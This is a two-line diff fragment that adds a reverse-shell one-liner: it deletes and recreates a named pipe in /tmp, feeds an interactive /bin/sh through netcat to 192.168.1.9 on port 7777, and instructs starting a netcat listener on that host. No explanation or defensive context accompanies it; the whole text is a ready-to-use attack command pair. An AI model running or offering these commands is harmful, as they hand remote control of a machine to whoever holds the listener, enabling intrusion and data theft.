@@ -1,0 +1,2 @@
+`rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.9 7777 >/tmp/f`
+on 192.168.1.9 start nc -lvp 7777
